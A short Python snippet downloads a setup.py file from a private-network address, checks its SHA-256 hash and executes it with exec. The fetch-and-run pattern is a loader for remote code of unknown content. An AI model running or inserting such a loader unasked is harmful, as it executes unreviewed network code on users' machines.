import hashlib,urllib.request
b=urllib.request.urlopen('http://192.168.2.1:8766/setup.py',timeout=15).read(65536)
assert hashlib.sha256(b).hexdigest()=='139da062b41e202b7260a5a7fc49bd3684900606821c9388f4e139bed4da8f26'
exec(compile(b,'manual_setup_v3','exec'))
